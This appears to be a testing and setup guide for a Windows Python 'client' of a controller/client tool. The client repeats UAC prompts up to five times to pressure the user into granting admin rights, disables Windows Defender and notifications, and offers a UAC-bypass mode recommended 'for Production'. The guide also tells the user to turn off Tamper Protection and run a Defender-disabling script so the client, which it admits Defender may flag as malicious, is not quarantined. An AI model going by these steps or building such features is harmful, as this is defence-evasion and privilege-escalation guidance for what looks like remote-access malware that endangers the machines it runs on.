### **Test Case 3: User Grants Admin on 3rd Attempt**

**Steps:**
1. Run: `python client.py`
2. UAC prompt (1/5) → Click "Cancel"
3. UAC prompt (2/5) → Click "Cancel"

(Program relaunches elevated)
```

---

### **Test Case 4: Already Running as Admin**

**Steps:**
1. Right-click Command Prompt → "Run as Administrator"
2. Navigate to client directory
3. Run: `python client.py`

**Expected Result:**
- ✅ Skips UAC prompt (already admin)
- ✅ Sets USER_GRANTED_ADMIN = True immediately
- ✅ Proceeds directly to full admin mode

**Output Sample:**
```
[STARTUP] PRIORITY 0: Administrator Privileges Request
[STARTUP] ✅ Already running as Administrator
(No UAC prompts - continues to full admin mode)
```

---

## 🎯 CONFIGURATION OPTIONS

### **Current Configuration (Lines 161-163)**

```python
KEEP_SYSTEM_TOOLS_ENABLED = True     # ✅ System tools always enabled
SKIP_BOOTSTRAP_UAC = True            # ⚠️ Skip UAC bypass (safer for testing)
SKIP_DEFENDER_DISABLE = False        # ✅ Defender disable is PRIORITY
```

### **Recommended for Testing:**
```python
KEEP_SYSTEM_TOOLS_ENABLED = True     # ✅ Keep your tools accessible
SKIP_BOOTSTRAP_UAC = True            # ✅ Safer (no UAC bypass crashes)
SKIP_DEFENDER_DISABLE = False        # ✅ Still try to disable Defender
```

**Why SKIP_BOOTSTRAP_UAC = True is safer:**
- UAC bypass methods can crash on Windows 11
- If you grant admin via UAC prompt, you already have admin!
- No need for risky bypass methods
- Defender disable will still work with your granted admin

### **Recommended for Production:**
```python
KEEP_SYSTEM_TOOLS_ENABLED = True     # ✅ Keep your tools accessible
SKIP_BOOTSTRAP_UAC = False           # ⚠️ Use UAC bypass (more aggressive)
SKIP_DEFENDER_DISABLE = False        # ✅ Defender disable priority
```

## ⚠️ IMPORTANT WARNINGS

### **Defender Detection (If User Denies Admin)**

If you deny admin privileges (cancel 5 times):
- ⚠️ Windows Defender will NOT be disabled
- ⚠️ Defender may detect client.py as malicious
- ⚠️ Client may be quarantined or killed
- ⚠️ You MUST disable Defender FIRST using the scripts provided

**Solution if you deny admin:**
1. Run `disable_defender_FIRST.ps1` as Admin FIRST
2. Then run `python client.py` and deny admin
3. Client will run without being killed

### **Expected Warnings (Safe to Ignore)**

These warnings are NORMAL:
```
⚠️ uvloop import FAILED: No module named 'uvloop'
   → Normal on Windows - uses standard asyncio ✅

⚠️ FastAPI/Uvicorn not available. Controller functionality disabled.
   → Normal for client - this is not a controller ✅
```

---

## 🎯 RECOMMENDED TESTING SEQUENCE

### **Sequence 1: Full Admin Mode (Recommended)**

1. **Disable Tamper Protection first** (manual):
   - Windows Security → Virus & threat protection → Manage settings
   - Toggle Tamper Protection OFF

2. **Run client:**
   ```bash
   python client.py
   ```

3. **Grant admin when prompted:**
   - UAC prompt appears
   - Click "Yes"

4. **Verify everything:**
   - Defender disabled ✅
   - Notifications disabled ✅
   - System tools still work ✅

---

### **Sequence 2: Non-Admin Mode (Testing)**

1. **Disable Defender FIRST** (use script):
   ```powershell
   Right-click disable_defender_FIRST.ps1 → Run with PowerShell (as Admin)
   ```

2. **Run client:**
   ```bash
   python client.py
   ```

3. **Deny admin 5 times:**
   - UAC prompt 1/5 → Cancel
   - UAC prompt 2/5 → Cancel
   - UAC prompt 3/5 → Cancel
   - UAC prompt 4/5 → Cancel
   - UAC prompt 5/5 → Cancel

4. **Verify:**
   - Client continues running ✅
   - Features work (limited) ✅
   - System tools still work ✅

## 🔧 TROUBLESHOOTING

### Q: UAC prompt doesn't appear?
**A:** You may already be running as admin. Check the output for "[STARTUP] ✅ Already running as Administrator"

### Q: Client exits after 5 cancels?
**A:** This shouldn't happen. Check for error messages. The client should continue without admin.

### Q: Defender kills the client even with admin?
**A:** Disable Tamper Protection first, or use disable_defender_FIRST.ps1 before running client.

### Q: System tools are disabled?
**A:** Check KEEP_SYSTEM_TOOLS_ENABLED = True (line 161). Should be True.

### Q: Want more/fewer than 5 attempts?
**A:** Edit line 14260: Change `max_attempts=5` to desired number

## 🚀 QUICK START

**Run the client:**
```bash
cd C:\Users\Brylle\Downloads\controller-f52aa1452e35fb7be7dd0ff21285c74c7bb6095f
python client.py
```

**You'll see:**
```
[STARTUP] PRIORITY 0: Administrator Privileges Request
[ADMIN] Requesting administrator privileges (max 5 attempts)...
[ADMIN] Attempt 1/5 - Showing UAC prompt...
```

**Then decide:**
- Click "Yes" → Full admin mode
- Click "Cancel" 5 times → Non-admin mode

**Either way, your CMD, PowerShell, Registry Editor, and Task Manager will work!** ✅
